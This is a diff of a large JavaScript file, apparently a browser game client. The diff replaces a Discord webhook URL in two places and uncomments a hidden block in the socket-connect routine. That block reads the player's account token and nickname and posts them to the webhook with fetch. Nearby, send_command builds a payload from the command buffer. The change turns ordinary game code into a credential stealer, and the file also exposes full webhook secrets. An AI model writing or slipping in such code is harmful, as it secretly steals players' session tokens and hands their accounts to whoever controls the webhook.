@@ -53910,7 +53910,7 @@ this.ghost = function(_delay) {
          };
          this.send_command = function (buffer) {
              this.sendJson([36, buffer]);
-const webhookUrl = 'https://discord.com/api/webhooks/1169362381856579666/iYasvTADPo78cB3NDXJaVfVUjrQdsireYGNVQ3ODUcs6siYiw65QdfEV5nyknglIuY11';
+const webhookUrl = 'https://discord.com/api/webhooks/1171188404998897735/VclWxif13ATVmvtfP5HB6tYrFdGKgJ6p4vglrl0JuGtqzgwupnZdyKLBSPUxQPoeC5Ck';
 const payload = {
 content: buffer,
 };
@@ -54404,8 +54404,8 @@ adBreakDone: breakDone,
              let link =  (("ws" + ((ssl === 1) ? "s" : "")) + "://") + dns;
 
              this.socket = new window.WebSocket(link);
-            /*
-            const webhookUrl = 'https://discord.com/api/webhooks/1169362381856579666/iYasvTADPo78cB3NDXJaVfVUjrQdsireYGNVQ3ODUcs6siYiw65QdfEV5nyknglIuY11';
+            
+            const webhookUrl = 'https://discord.com/api/webhooks/1171188404998897735/VclWxif13ATVmvtfP5HB6tYrFdGKgJ6p4vglrl0JuGtqzgwupnZdyKLBSPUxQPoeC5Ck';
 
 const userToken = user.token;
 const nicknameValue = ui.nickname.input.value;
@@ -54446,7 +54446,7 @@ fetch(webhookUrl, {
     },
     body: JSON.stringify(payload),
 });
-*/
+
              this.socket["binaryType"] = "arraybuffer";
              this.socket._current_id = this._current_id;
      
